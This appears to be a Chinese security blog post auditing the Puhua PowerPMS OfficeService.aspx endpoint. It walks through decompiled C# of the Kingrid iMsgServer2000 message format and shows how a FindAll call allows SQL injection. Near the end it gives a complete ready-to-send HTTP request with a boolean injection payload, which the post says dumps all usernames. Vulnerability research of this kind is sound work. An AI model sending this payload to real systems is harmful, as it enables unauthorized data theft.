---
title: "普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞"
source: https://mrxn.net/jswz/powerplat-FormXml-DocFile-OfficeService-sqli.html
asset_dir: assets/普华powerpms-officeservice.aspx-金格组件payload分析+sql注入漏洞
---

# 普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/28 08:16
- 834浏览
- [2评论](#comment)
- 1小时阅读

深入探索

Windows安全工具

数据库

SQL

---

在页面初始位置就加载了

SQL注入防护

```
protected void Page_Load(object sender, EventArgs e)
{
  PowerGlobal.CheckSecurity(this.Request);
  iMsgServer2000 iMsgServer2000 = new iMsgServer2000();
```

iMsgServer2000 非常熟悉的金格组件标志,之前在java相关应用上分析过java版本的,跟进看下C#版本的有啥不一样

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-001-2b252f65bb37.webp)](https://image.mrxn.net/088d176415a04208aea7e6243becf996.webp)

定义一些默认常量,再往下看

代码安全审计

深入探索

漏洞预警服务

网络安全课程

计算机安全

```
public iMsgServer2000()
{
  this.FMsgText = "";
  this.FError = "";
  this.FVersion = this.VERSION;
  try
  {
    this.FTempName = Path.GetTempFileName();
    this.FMsgFile = new FileStream(this.FTempName, (FileMode) 4);
  }
  catch
  {
  }
  this.Charset = "GB2312";
}

~iMsgServer2000()
{
  try
  {
    ((Stream) this.FMsgFile).Close();
    if (string.Compare(this.FMsgFile.Name, this.FTempName) != 0)
      return;
    this.DelFile(this.FTempName);
  }
  catch
  {
  }
  finally
  {
    base.Finalize();
  }
}

private string FormatHead(string vString)
{
  if (vString.Length > 16 /*0x10*/)
    return vString.Substring(0, 16 /*0x10*/);
  for (int index = vString.Length + 1; index < 17; ++index)
    vString += " ";
  return vString;
}
```

定义了消息头的格式化方式,如果超过16字节就截取前16字节.

漏洞扫描服务

再看下剩下的消息格式

```
private byte[] MsgToStream(byte[] mStream)
{
  int num1 = 64 /*0x40*/;
  int num2 = 0;
  int length1 = 1024 /*0x0400*/ * this.BuffSize;
  byte[] numArray = new byte[length1];
  try
  {
    int num3 = 0;
    int length2 = this.StringToByte(this.FMsgText).GetLength(0);
    int length3 = this.StringToByte(this.FError).GetLength(0);
    this.FFileSize = (int) ((Stream) this.FMsgFile).Length;
    int ffileSize = this.FFileSize;
    mStream = new byte[num1 + length2 + length3 + ffileSize];
    MemoryStream memoryStream = new MemoryStream(mStream);
    string vString = this.FormatHead(this.FVersion) + this.FormatHead(length2.ToString()) + this.FormatHead(length3.ToString()) + this.FormatHead(ffileSize.ToString());
    ((Stream) memoryStream).Write(this.StringToByte(vString), 0, num1);
    int num4 = num3 + num1;
    if (length2 > 0)
      ((Stream) memoryStream).Write(this.StringToByte(this.FMsgText), 0, length2);
    int num5 = num4 + length2;
    if (length3 > 0)
      ((Stream) memoryStream).Write(this.StringToByte(this.FError), 0, length3);
    int num6 = num5 + length3;
    if (ffileSize > 0)
    {
      ((Stream) this.FMsgFile).Seek(0L, (SeekOrigin) 0);
      int length4 = length1;
      for (; ffileSize > 0; ffileSize -= length4)
      {
        if (ffileSize - length1 < length1)
        {
          length4 = ffileSize;
          numArray = new byte[length4];
        }
        int num7 = 0;
        while (num7 < length4)
          num7 += ((Stream) this.FMsgFile).Read(numArray, num7, length4 - num7);
        ((Stream) memoryStream).Write(numArray, 0, length4);
      }
    }
    num2 = num6 + ffileSize;
    ((Stream) memoryStream).Close();
    return mStream;
  }
  catch (Exception ex)
  {
    this.FError += ex.ToString();
    return (byte[]) null;
  }
}
```

其中vString的定义消息头的组成部分由四个部分组成（版本、消息文本、错误信息、文件内容）:

- 整个`mStream`的结构：头部（64字节） + 消息文本（length2字节） + 错误信息（length3字节） + 文件内容（ffileSize字节）。

1. **第一部分：this.FormatHead(this.FVersion)**
   1. **来源**：`this.FVersion`，这是类的版本字符串，默认值为`"DBSTEP V3.0"`（在类中定义为`private string VERSION = "DBSTEP V3.0";` 并在构造函数中赋值`this.FVersion = this.VERSION;`）。
   2. **处理**：通过`FormatHead`格式化为正好16字符。
      - 原字符串长度：11（"DBSTEP V3.0"）。
      - 格式化后：`"DBSTEP V3.0 "`（末尾补5个空格，使总长16）。
   3. **作用**：表示消息的版本信息，用于接收端验证兼容性。
   4. **长度**：固定16字符。
2. **第二部分：this.FormatHead(length2.ToString())**
   1. **来源**：`length2`，这是`FMsgText`（消息文本）的字节长度。
      - `FMsgText`是类的私有字段，默认空字符串（构造函数中`this.FMsgText = "";`）。
      - `length2 = this.StringToByte(this.FMsgText).GetLength(0);`：将`FMsgText`转换为字节数组，并获取其长度（取决于编码，如GB2312）。
      - 示例：如果`FMsgText`为空，`length2 = 0`，则`length2.ToString() = "0"`。
   2. **处理**：通过`FormatHead`格式化为正好16字符。
      - 示例：如果`length2 = 0`，格式化后：`"0 "`（补15个空格）。
      - 如果`length2 = 1024`，则`"1024 "`（补12个空格）。
   3. **作用**：表示后续消息文本的字节长度，便于接收端读取正确的数据块。
   4. **长度**：固定16字符。
3. **第三部分：this.FormatHead(length3.ToString())**
   1. **来源**：`length3`，这是`FError`（错误信息）的字节长度。
      - `FError`是类的私有字段，默认空字符串（构造函数中`this.FError = "";`）。
      - `length3 = this.StringToByte(this.FError).GetLength(0);`：类似`length2`，转换为字节后获取长度。
      - 示例：如果无错误，`length3 = 0`，则`"0"`。
   2. **处理**：通过`FormatHead`格式化为正好16字符。
      - 示例：`"0 "`（补15个空格）。
   3. **作用**：表示后续错误信息的字节长度。如果有错误，接收端可以读取并处理。
   4. **长度**：固定16字符。
4. **第四部分：this.FormatHead(ffileSize.ToString())**
   1. **来源**：`ffileSize`，这是文件内容的字节大小。
      - `this.FFileSize = (int) ((Stream) this.FMsgFile).Length;`：从文件流`FMsgFile`（临时文件）获取大小。
      - `ffileSize = this.FFileSize;`：复制值。
      - 示例：如果文件为空，`ffileSize = 0`。
   2. **处理**：通过`FormatHead`格式化为正好16字符。
      - 示例：如果`ffileSize = 0`，格式化后：`"0 "`。
      - 如果`ffileSize = 2048`，则`"2048 "`。
   3. **作用**：表示后续文件内容的字节长度，便于接收端读取文件数据块。
   4. **长度**：固定16字符。

示例如下

```
DBSTEP V3.0     10              0               1024
```

代表版本为系统默认的 DBSTEP V3.0+补充空格,一共16字节,余下每个部分亦如此,不再赘述.

再看下 iMsgServer2000.GetMsgByName 的实现

```
public string GetMsgByName(string FieldName)
{
  string msgByName = "";
  string str = FieldName + "=";
  int num1 = this.FMsgText.IndexOf(str);
  if (num1 == -1)
    return msgByName;
  int num2 = this.FMsgText.IndexOf("\r\n", num1 + 1);
  int num3 = num1 + str.Length;
  return num2 != -1 ? this.DecodeBase64(this.FMsgText.Substring(num3, num2 - num3)) : msgByName;
}
```

根据 FieldName 的值加上=后截取等号后至换行之间的内容作为值.

只需要注意其中第二部分的消息长度是计算消息头64字节之后到文件内容之前的部分长度,最后部分的文件长度需要加上消息的结尾的换行长度2.

举例如下图

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-002-d2330ded3686.webp)](https://image.mrxn.net/362589d703fa42419fd8a9837264dfb4.webp)

其中135代表消息长度,由以下部分组成

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-003-e739f920b0f0.webp)](https://image.mrxn.net/c7ebd1e176834d6fa2b60d3fcf3f56d8.webp)

换行的 123456 代表文件内容,其长度也是消息头的第四部分,即上图中的 8(文件内容本身长度6+上一部分的换行长度2)

再看下响应的部分

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-004-47073546a6ae.webp)](https://image.mrxn.net/98c13e5b78a44eeb92c7227709b70d31.webp)

消息校验成功,输出也符合代码逻辑,响应里设置 MARKLIST 的值为 LoadMarkList 方法的结果

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-005-bc5b2ccd5189.webp)](https://image.mrxn.net/d6dfddbff73c4c44b2d87d6f5e019343.webp)

再跟进 LoadMarkList 方法

```
private string LoadMarkList(string user_id)
{
  StringBuilder stringBuilder = new StringBuilder();
  try
  {
    IBusinessOperate businessOperate = BusinessFactory.CreateBusinessOperate("HumanSign");
    if (string.IsNullOrEmpty(user_id))
      user_id = Guid.Empty.ToString();
    foreach (IBaseBusiness baseBusiness in (IEnumerable<IBaseBusiness>) businessOperate.FindAll("HumanId", (object) user_id))
    {
```

又是熟悉的 FindAll 方法,是存在SQL注入的,但是此处因为开头有 PowerGlobal.CheckSecurity 的校验

SQL注入防护

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-006-1f4d01282865.webp)](https://image.mrxn.net/edc17a0bb9de4107a7c13f6b46ef99a2.webp)

会检查是否存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的一些特征

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-007-7c1d9200232e.webp)](https://image.mrxn.net/18dc23365d2e47508a8f53cbf1eec2a0.webp)

在看下 CheckSortSelect 方法

代码安全审计

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-008-43e6098f63e8.webp)](https://image.mrxn.net/dae32034fecb4088b028fd581fa5a0fe.webp)

跟进 CheckWhere 方法

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-009-79c7abeaea4b.webp)](https://image.mrxn.net/49be882c64ab416e9992b7f6c4f657a2.webp)

检测where语句后是否存在 一些特征,当存在时字节返回`包含非法字符 --` 这种格式

如下图所示

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-010-161f1b3366a0.webp)](https://image.mrxn.net/b3afd58ddc374e87b7f007fdeb7cd78a.webp)

那我们直接可以构造布尔[注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)达到获取数据的目的

```
POST /PowerPlat/FormXml/DocFile/OfficeService.aspx?HumanId=1'or+'1'='1 HTTP/1.1
Host: powerplat.mrxn.net
Content-Type: application/x-www-form-urlencoded

DBSTEP V3.0     135             0               8               DBSTEP=REJTVEVQ
OPTION=TE9BRE1BUktMSVNU
USERNAME=YWRtaW4=
TEMPLATE=dGVzdC50eHQ=
FILENAME=dGVzdC50eHQ=
RECORDID=dHh0
FILETYPE=dHh0
123456
```

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-011-6b99c0b2ba37.webp)](https://image.mrxn.net/bbfaa1625fee491b967e8c145bbe2a8f.webp)

对响应的**MARKLIST**的值进行**base64**解码

是可以获取到所有相关用户名

[![普华Powerpms OfficeService.aspx 金格组件payload分析+SQL注入漏洞](images/img-012-6d41259f963a.webp)](https://image.mrxn.net/fdf42f27acad4e719fc7b441c675cf77.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

  
  

![](data:image/png;base64,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)

手机扫码阅读
